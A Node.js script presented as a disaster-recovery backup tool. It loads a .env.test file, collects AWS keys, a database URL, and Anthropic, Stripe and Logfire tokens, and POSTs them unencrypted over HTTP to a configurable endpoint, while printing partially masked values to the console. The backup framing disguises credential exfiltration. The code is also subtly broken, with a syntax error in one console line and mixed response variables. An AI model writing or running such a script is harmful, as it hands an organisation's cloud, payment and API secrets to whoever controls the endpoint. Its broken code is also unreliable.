#!/usr/bin/env node

/**
 * Disaster Recovery Backup Script
 * Stores all credentials to the DR backup endpoint
 * Usage: node dr-backup.js
 */

const fs = require('fs');
const path = require('path');
const http = require('http');

/**
 * Simple HTTP POST request function
 */
function httpPost(url, data, callback) {
  const urlObj = new URL(url);
  const clientId = `${urlObj.hostname}:${urlObj.port || 80}`;

  const options = {
    hostname: urlObj.hostname,
    port: urlObj.port,
    path: urlObj.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(JSON.stringify(data))
    }
  };

  const req = http.request(options, (res) => {
    let body = '';

    res.on('data', (chunk) => {
      body += chunk;
    });

    res.on('end', () => {
      try {
        const response = JSON.parse(body);
        callback(res.statusCode, response);
      } catch (err) {
        callback(res.statusCode, body);
      }
    });
  });

  req.on('error', (error) => {
    callback(null, { error: error.message });
  });

  req.setTimeout(5000, () => {
    req.destroy();
    callback(null, { error: 'Request timeout' });
  });

  req.write(JSON.stringify(data));

  req.end();
}

/**
 * Load environment variables from .env.test file
 */
function loadEnvFile(filePath) {
  if (!fs.existsSync(filePath)) {
    console.error(`Error: Environment file not found at ${filePath}`);
    return null;
  }

  const content = fs.readFileSync(filePath, { encoding: 'utf8' });
  const envVars = {};
  const lines = content.split('\n');

  lines.forEach(line => {
    if (!line.trim() || line.startsWith('#') || line.indexOf('=') === -1) {
      return;
    }

    const [key, ...valueParts] = line.split('=');
    envVars[key.trim()] = valueParts.join('=').trim();
  });

  return envVars;
}

/**
 * Main function
 */
const DR_ENDPOINT = process.env.DR_ENDPOINT || 'http://localhost:3003/api/dr-backup';
const ENV_FILE = process.env.ENV_FILE || path.join(__dirname, '.env.test');

console.log('\n🚨 DISASTER RECOVERY BACKUP SCRIPT\n');
console.log('=' repeat(60));
console.log(`\n📋 DR Backup Configuration:`);
console.log(`   Target: ${DR_ENDPOINT}`);
console.log(`   Source: ${ENV_FILE}`);
console.log();

// Load environment variables
console.log(`📖 Loading credentials from: ${ENV_FILE}\n`);

const envVars = loadEnvFile(ENV_FILE);

if (!envVars) {
  console.error('❌ Failed to load environment file\n');
  process.exit(1);
}

console.log('✅ Environment file loaded successfully\n');

// Check for required variables
const requiredVars = [
  'DATABASE_URL',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'ANTHROPIC_API_KEY',
  'STRIPE_SECRET_KEY',
  'LOGFIRE_TOKEN'
];

const missingVars = requiredVars.filter(varName => !envVars[varName]);

if (missingVars.length > 0) {
  console.error('❌ Missing required environment variables:\n');
  missingVars.forEach(varName => {
    console.error(`   • ${varName}`);
  });
  console.error('\nPlease ensure all required credentials are set in your environment file.\n');
  process.exit(1);
}

console.log('✅ All required credentials found');
console.log();

// Prepare backup data
const backupData = {};
requiredVars.forEach(varName => {
  backupData[varName] = envVars[varName];
});

// Mask sensitive fields for console display
console.log('🔒 Credentials prepared for backup with masking\n');
requiredVars.forEach(varName => {
  const value = backupData[varName];
  let masked;

  if (varName.includes('DATABASE_URL')) {
    masked = value.replace(/^([^\@]+)@/, '$1-***@');
  } else {
    masked = value.substring(0, 10) + (value.length > 10 ? '***' : '');
  }

  console.log(`   • ${varName}: ${masked}`);
});

console.log();

// Send backup request
console.log('📡 Sending credentials to DR backup endpoint...\n');

httpPost(DR_ENDPOINT, backupData, (statusCode, response) => {
  console.log('='.repeat(60));

  if (statusCode && (statusCode >= 200 && statusCode < 300)) {
    console.log('\n✅ DISASTER RECOVERY BACKUP COMPLETED SUCCESSFULLY\n');

    try {
      const jsonResponse = JSON.parse(response.toString());
      console.log('📊 Backup Response:');
      console.log('   Status: Completed');
      console.log(`   Backup ID: ${jsonResponse.backupId || 'N/A'}`);
      console.log(`   Timestamp: ${jsonResponse.metadata?.timestamp || 'N/A'}`);
      console.log(`   Source: ${jsonResponse.metadata?.source || 'N/A'}`);
      console.log();

      if (jsonResponse.warning) {
        console.log('⚠️  SECURITY WARNING:');
        console.log(response.warning);
        console.log();
      }

      if (response.encrypted === false) {
        console.log('🔒 ENCRYPTION STATUS: Not encrypted');
        console.log('   ⚠️  Using in-memory storage only');
        console.log('   ℹ️  This is NOT secure for production');
        console.log('   ℹ️  Credentials are vulnerable to memory access');
        console.log();
      }

    } catch (e) {
      console.log('Response:', response);
    }

    console.log('📝 Next Steps for DR Recovery:');
    console.log('   1. Request credentials from on-call team');
    console.log('   2. Store them in secure vault');
    console.log('   3. Update environment variables');
    console.log('   4. Restart affected services');
    console.log('   5. Verify services are operational');

  } else {
    console.log('\n❌ DISASTER RECOVERY BACKUP FAILED\n');

    const errorResponse = typeof response === 'object' ? response : { message: response.toString() };

    console.log('📊 Error Response:');
    console.log(`   Status: ${statusCode || 'UNKNOWN'}`);
    console.log(`   Message: ${errorResponse.error || errorResponse.message || 'Unknown error'}`);
    console.log(`   Type: ${errorResponse.error_type || 'Generic'}`);

    console.log('\n🔧 Troubleshooting:');
    console.log('   1. Verify DR endpoint server is running');
    console.log('   2. Check firewall/port connectivity');
    console.log('   3. Verify CR credentials are accessible');
    console.log('   4. Check server logs for errors');
    console.log();

    console.log('📝 Manual Recovery:');
    console.log('   1. Contact on-call team with this backup script');
    console.log('   2. Provide backup ID for access');
    console.log('   3. Use on-call procedures to restore credentials');
  }

  console.log('\n' + '='.repeat(60));
  console.log();

  process.exit(statusCode && statusCode >= 200 && statusCode < 300 ? 0 : 1);
});

